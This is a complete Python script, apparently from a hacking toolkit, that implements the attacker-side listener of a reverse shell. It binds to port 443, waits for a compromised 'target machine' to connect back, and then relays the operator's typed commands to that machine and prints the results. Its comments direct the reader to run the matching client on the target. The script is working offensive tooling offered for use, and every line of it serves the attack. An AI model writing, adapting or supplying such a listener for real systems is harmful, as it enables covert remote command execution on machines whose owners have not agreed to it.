#!/usr/bin/env python3

# Reverse Shell Written by NOCH in Python3 #

# Run this listening server on your machine, then execute the client on target machine #
# Change SERVER_HOST and SERVER_PORT accordingly #

import socket

# Initialisation of listening IP, port and buffer size
SERVER_HOST = "0.0.0.0" # CHANGE ME
SERVER_PORT = 443 # CHANGE ME
BUFFER_SIZE = 4096 # SEND 4KB at a time

# Create socket object and bind it to IP and port
server = socket.socket()
server.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server.listen(5)
listening = "[+] Server Listening on {0}:{1}".format(SERVER_HOST, SERVER_PORT)
print(listening)

# Accept incoming connections
client_conn, client_addr = server.accept()
connection = "[+] {0}:{1} Connected successfully.".format(client_addr[0], client_addr[1])
print(connection)

# Shell Commands loop
while True:
    # command input
    cmd = input("> ")
    # cmd -> client
    client_conn.send(cmd.encode())

    if cmd.upper() == "EXIT":
        break

    result = client_conn.recv(BUFFER_SIZE).decode()
    print(result)

# Terminate connection
client_conn.close()
server.close()
